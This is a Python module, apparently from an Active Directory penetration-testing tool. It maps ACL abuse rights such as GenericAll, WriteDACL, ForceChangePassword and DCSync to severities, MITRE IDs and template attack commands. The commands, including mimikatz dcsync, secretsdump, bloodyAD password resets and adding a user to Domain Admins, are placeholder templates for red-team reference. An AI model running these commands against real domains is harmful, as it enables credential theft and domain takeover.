from __future__ import annotations

from dataclasses import dataclass

# AD-specific access masks (see impacket ntlmrelayx LDAPAttack)
AD_GENERIC_ALL = 0x000F01FF
AD_GENERIC_WRITE = 0x00020028

# Standard ACCESS_MASK flags used in ACE parsing
GENERIC_ALL = 0x10000000
GENERIC_WRITE = 0x40000000
WRITE_DACL = 0x00040000
WRITE_OWNER = 0x00080000

ADS_RIGHT_DS_CONTROL_ACCESS = 0x00000100
ADS_RIGHT_DS_WRITE_PROP = 0x00000020
ADS_RIGHT_DS_SELF = 0x00000008

# Extended rights / property GUIDs (BloodHound-compatible)
GUID_FORCE_CHANGE_PASSWORD = "00299570-246d-11d0-a768-00aa006e0529"
GUID_MEMBER = "bf9679c0-0de6-11d0-a285-00aa003049e2"
GUID_USER = "bf967aba-0de6-11d0-a285-00aa003049e2"
GUID_GROUP = "bf967a9c-0de6-11d0-a285-00aa003049e2"
GUID_SPN = "f3a64788-5306-11d1-a9c5-0000f80367c1"
GUID_GET_CHANGES = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
GUID_GET_CHANGES_ALL = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
GUID_READ_LAPS = "76b1b53d-9845-4377-b13d-b23b016dae40"
GUID_READ_GMSA = "6a02b086-bf7f-4350-9596-0d985aaa0064"
GUID_ADD_KEY_CREDENTIAL = "5b47d60f-6090-40b2-9f37-2a7de88ef099"


@dataclass(frozen=True)
class AbuseRight:
    key: str
    title: str
    severity: str
    mitre_id: str
    exploit_summary: str
    manual_commands: tuple[str, ...]
    guide_key: str = "acl_abuse"


ABUSE_RIGHTS: dict[str, AbuseRight] = {
    "genericall": AbuseRight(
        key="genericall",
        title="GenericAll",
        severity="critical",
        mitre_id="T1098",
        exploit_summary=(
            "Full control — reset password, modify SPN, shadow creds, or group membership."
        ),
        manual_commands=(
            "bloodyAD --host <DC> -d <DOMAIN> -u user -p pass set password <target> <newpass>",
            "dacledit.py -action write -rights FullControl ...",
        ),
    ),
    "genericwrite": AbuseRight(
        key="genericwrite",
        title="GenericWrite",
        severity="high",
        mitre_id="T1098",
        exploit_summary="Write object attributes — shadow credentials, SPN, or RBCD fields.",
        manual_commands=(
            "pywhisker -d <DOMAIN> -u user -p pass --target <target> -a add",
            "rbcd.py -action write -delegate-from <computer$> -delegate-to <target>",
        ),
    ),
    "writedacl": AbuseRight(
        key="writedacl",
        title="WriteDACL",
        severity="critical",
        mitre_id="T1098",
        exploit_summary="Grant yourself GenericAll on the target, then abuse object rights.",
        manual_commands=(
            "dacledit.py -action write -rights FullControl -principal <you> -target-dn <dn>",
            "bloodyAD add genericAll <you> <target>",
        ),
    ),
    "writeowner": AbuseRight(
        key="writeowner",
        title="WriteOwner",
        severity="high",
        mitre_id="T1098",
        exploit_summary="Take ownership, then grant GenericAll via WriteDACL.",
        manual_commands=(
            "owneredit.py -action write -new-owner <you> -target-dn <dn>",
            "dacledit.py -action write -rights FullControl ...",
        ),
    ),
    "forcechangepassword": AbuseRight(
        key="forcechangepassword",
        title="ForceChangePassword",
        severity="high",
        mitre_id="T1098",
        exploit_summary="Set a new password on the target user without knowing the old one.",
        manual_commands=(
            "net rpc password <target> <newpass> -U <DOMAIN>/user%pass -S <DC>",
            "bloodyAD --host <DC> -d <DOMAIN> -u user -p pass set password <target> <newpass>",
        ),
    ),
    "addmember": AbuseRight(
        key="addmember",
        title="AddMember",
        severity="critical",
        mitre_id="T1098",
        exploit_summary="Add your user to a privileged group (e.g. Domain Admins).",
        manual_commands=(
            "net group 'Domain Admins' user /add /domain",
            "ldap3 / bloodyAD add groupMember <group> <user>",
        ),
    ),
    "addself": AbuseRight(
        key="addself",
        title="AddSelf",
        severity="critical",
        mitre_id="T1098",
        exploit_summary="Add yourself to the group via Self membership right.",
        manual_commands=(
            "ldapmodify: add member attribute with your DN on group object",
            "bloodyAD add groupMember <group> <you>",
        ),
    ),
    "readlapspassword": AbuseRight(
        key="readlapspassword",
        title="ReadLAPSPassword",
        severity="high",
        mitre_id="T1555",
        exploit_summary="Read ms-Mcs-AdmPwd (LAPS local admin password).",
        manual_commands=(
            "nxc ldap <DC> -u user -p pass --laps",
            "Get-AdmPwdPassword (RSAT LAPS module)",
        ),
    ),
    "readgmsapassword": AbuseRight(
        key="readgmsapassword",
        title="ReadGMSAPassword",
        severity="high",
        mitre_id="T1555",
        exploit_summary="Read gMSA managed password hash for service account takeover.",
        manual_commands=(
            "nxc ldap <DC> -u user -p pass --gmsa",
            "gMSADumper.py -u user -p pass -d <DOMAIN>",
        ),
    ),
    "writespn": AbuseRight(
        key="writespn",
        title="WriteSPN",
        severity="high",
        mitre_id="T1558",
        exploit_summary="Set servicePrincipalName on target user for Kerberoast / targeted roast.",
        manual_commands=(
            "targetedKerberoast.py -d <DOMAIN> -u user -p pass --targets <target>",
            "Set-DomainObject -Identity <target> -SET @{serviceprincipalname=...}",
        ),
    ),
    "dcsync": AbuseRight(
        key="dcsync",
        title="DCSync",
        severity="critical",
        mitre_id="T1003.006",
        exploit_summary="Replicate domain password hashes (GetChanges + GetChangesAll on domain).",
        manual_commands=(
            "secretsdump.py <DOMAIN>/user:pass@<DC> -just-dc",
            "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt",
        ),
    ),
    "owns": AbuseRight(
        key="owns",
        title="Owner",
        severity="high",
        mitre_id="T1098",
        exploit_summary="Object owner can modify DACL and take full control.",
        manual_commands=("owneredit.py / dacledit.py — grant GenericAll then abuse",),
    ),
}


def abuse_right(key: str) -> AbuseRight:
    return ABUSE_RIGHTS.get(
        key,
        AbuseRight(
            key=key,
            title=key,
            severity="medium",
            mitre_id="T1098",
            exploit_summary=f"Abuse {key} ACE against target object.",
            manual_commands=("guide acl_abuse",),
        ),
    )
